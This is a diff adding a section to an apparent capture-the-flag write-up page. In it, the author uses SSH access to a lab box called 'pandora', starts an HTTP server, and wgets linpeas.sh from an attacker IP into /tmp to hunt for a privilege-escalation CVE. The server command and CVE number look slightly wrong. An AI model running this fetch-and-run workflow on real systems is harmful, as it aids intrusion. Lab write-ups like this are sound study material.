@@ -436,6 +436,25 @@ Swap space
 <h3 id="initial-enumerationservice-scan">SSH</h3>
 <p>I use the credential which found above to ssh to server and it works but just normal priviledge. I will find the way up there later.</p>
 <figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png 999w, https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppi/ssh_access.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>ssh to victim</strong></figcaption></figure>
+<p>I use tmp folder to upload linpeas.sh in order to search for any possible root-free commands or cves. First, we have to create a http server on our computer by this command. After that, we connect to "our server" to download the script.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(suppie@parrot)-&#91;~]
+    sudo python3 http.server 8080
+    </pre></div>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(daniel@pandora:/tmp)-&#91;~]
+wget http://10.10.14.32:8080/linpeas.sh
+--2022-02-22 10:23:28--  http://10.10.14.32:8080/linpeas.sh
+Connecting to 10.10.14.32:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 765822 (748K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                        100%[============================================================>] 747.87K  90.5KB/s    in 11s     
+
+2022-02-22 10:23:39 (68.6 KB/s) - ‘linpeas.sh’ saved [765822/765822]
+    </pre></div>
+    <p>Then we run the script(don't forget to allow it(chmod)). While I was looking in to the result... oh hell yeah here come the badboy CVE-2021-3034</p>
+<figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/cve.png 999w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/cve.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppicves.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>CVE-2021-3034</strong></figcaption></figure>
+
     <!-- +++++ Projects Section +++++ -->
         
     <div class="container pt">
